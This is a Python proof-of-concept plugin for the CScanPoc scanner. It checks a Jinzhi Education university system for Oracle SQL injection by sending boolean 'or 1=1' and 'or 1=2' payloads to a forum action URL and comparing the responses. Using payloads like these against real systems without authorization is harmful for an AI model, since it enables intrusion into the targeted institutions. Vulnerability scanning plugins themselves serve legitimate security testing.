# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    poc_id = '3a7ade97-0778-4a9e-a4fb-841a35e97ccb'
    name = '金智教育高校系统存在通用型Oracle注射'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = ' 2014-08-04'  # 漏洞公布时间
    desc = '''
        江苏金智教育高校系统存在通用型Oracle注射漏洞。
        /elcs/forum/forumIndexAction!init.action
        /elcs/forum/forumIndexAction!init.action
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '金智教育CMS'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'e4c82325-3bcd-40c6-a944-bf97a238c811'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #ref http://wooyun.org/bugs/wooyun-2010-071006
            true_url = self.target + '/elcs/forum/forumIndexAction!init.action?categoryId=-11%20or%201=1'
            false_url = self.target + '/elcs/forum/forumIndexAction!init.action?categoryId=-11%20or%201=2'
            check = '<div class=categorycontent>  <table class=cateContentTable><tr class="headerTop"  >'
            #code, head,res1, errcode, _ = curl.curl2(true_url)
            #code, head,res2, errcode, _ = curl.curl2(false_url)
            r1 = requests.get(true_url)
            r2 = requests.get(false_url)
            if check  in r1.content and check not in r2.content:
                #security_hole(true_url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
